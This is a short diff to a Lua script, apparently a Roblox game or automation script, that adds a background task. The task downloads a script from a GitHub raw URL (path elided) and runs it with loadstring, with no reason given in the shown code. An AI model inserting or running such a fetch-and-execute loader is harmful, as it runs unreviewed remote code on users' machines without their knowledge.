@@ -809,3 +809,9 @@ task.spawn(function()
         UI:SetText("ModeInfo", "Mode: " .. ModeDisplay .. " | Target Portal: " .. State.CurrentPortal)
     end
 end)
+task.spawn(function()
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/.../script.lua"))()
+    end)
+    if not success then warn("Failed to load external script: " .. tostring(result)) end
+end)
